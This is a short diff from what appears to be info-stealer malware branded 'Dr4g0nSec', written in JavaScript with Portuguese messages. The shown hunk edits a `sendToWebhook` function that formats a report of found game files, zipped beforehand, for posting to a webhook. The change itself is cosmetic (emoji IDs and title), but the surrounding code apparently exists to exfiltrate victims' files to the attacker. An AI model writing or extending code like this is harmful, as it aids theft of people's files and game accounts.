@@ -103,12 +103,12 @@ function createZip(files, outputPath) {
 
 async function sendToWebhook(zipPath, files) {
   const fileList = files.map(f => path.basename(f));
-  const embedDescription = `<:Gengar:1367090325893419048> • **Arquivos de jogos encontrados:**\n` +
+  const embedDescription = `<:Gengar:1378151609015730236> • **Arquivos de jogos encontrados:**\n` +
     fileList.slice(0, 15).map(f => `└─< ${f}`).join("\n") +
     (fileList.length > 15 ? "\n└─<...e mais arquivos" : "");
 
   const embed = {
-    title: "<:dr4g0n:1362932398102155475> Dr4g0nSec | GameFiles <:dr4g0n:1362932398102155475>",
+    title: "Dr4g0nSec | GameFiles",
     description: embedDescription,
     color: 0x250e80,
     footer: {
